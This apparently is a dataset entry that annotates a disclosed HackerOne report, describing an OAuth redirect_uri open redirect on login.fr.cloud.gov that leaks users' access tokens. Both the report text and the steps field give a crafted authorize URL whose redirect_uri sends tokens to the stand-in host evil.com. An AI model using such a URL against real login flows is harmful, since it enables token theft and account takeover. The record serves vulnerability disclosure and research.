@@ -1,0 +1,38 @@
+{
+    "reported_to": "GSA Bounty",
+    "reported_by": "manshum12 ",
+    "title": "Stealing Users OAuth Tokens through redirect_uri parameter",
+    "content": "\nI found that https://login.fr.cloud.gov/oauth/authorize has vulnerability by open redirect on oauth redirect_uri which can lead to users oauth tokens being leaked to any malicious user.\nStep :\n1, Clicked on link https://login.fr.cloud.gov/oauth/authorize?client_id=\u2588\u2588\u2588&response_type=token&redirect_uri=https%3A%2F%2Fevil.com%2Fauth%2Fcallback&state=\u2588\u2588\u2588\n2, Choose any .gov account to login ( Screenshot ) then i believe you will got redirect to evil.com with oauth access token .\nImpact\nAttacker can using this bug to stolen victim access token , that means he can takeover victim account .\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": 750,
+    "weaknesses": [
+        "Open Redirect"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1569968700,
+    "report_url": "https://hackerone.com/reports/665651",
+    "is_multi_component": true,
+    "complexity": "MEDIUM",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Click on the link: https://login.fr.cloud.gov/oauth/authorize?client_id=\u2588\u2588\u2588&response_type=token&redirect_uri=https%3A%2F%2Fevil.com%2Fauth%2Fcallback&state=\u2588\u2588\u2588"
+        ],
+        [
+            2,
+            "Choose any .gov account to login, which will redirect to evil.com with the OAuth access token in the URL"
+        ]
+    ],
+    "vuln_description": "The vulnerability is an open redirect issue in the OAuth flow of login.fr.cloud.gov, where the redirect_uri parameter can be manipulated to redirect users to a malicious site (evil.com) after authentication, leaking their OAuth access token.",
+    "reason": "The attack is straightforward, involving only the manipulation of the redirect_uri parameter in a well-known OAuth flow. It does not require understanding complex interactions or states, nor is the logic novel.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
